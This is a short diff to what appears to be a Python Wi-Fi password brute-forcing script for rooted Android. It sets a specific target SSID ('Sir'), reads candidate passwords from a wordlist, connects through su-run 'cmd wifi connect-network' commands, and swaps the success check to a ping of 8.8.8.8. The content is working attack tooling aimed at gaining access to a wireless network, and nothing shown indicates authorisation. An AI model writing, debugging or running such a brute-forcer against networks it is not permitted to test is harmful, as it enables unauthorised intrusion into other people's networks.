@@ -4,7 +4,7 @@ import sys
 import threading
 import os
 
-SSID = "YourSSID"  # Target SSID
+SSID = "Sir"  # Target SSID
 SECURITY = "wpa2"
 WORDLIST_PATH = "passwords.txt"
 PROGRESS_FILE = "wifi_bruteforce_progress.txt"
@@ -17,8 +17,9 @@ def run_cmd(cmd):
     return result.returncode, result.stdout.strip(), result.stderr.strip()
 
 def is_connected():
-    code, out, err = run_cmd("su -c 'dumpsys wifi | grep \"SSID\"'")
-    return SSID in out
+    code, out, err = run_cmd("su -c 'ping -c 1 8.8.8.8'")
+    return code == 0
+
 
 def connect_to_wifi(password):
     cmd = f"su -c 'cmd wifi connect-network \"{SSID}\" {SECURITY} \"{password}\"'"
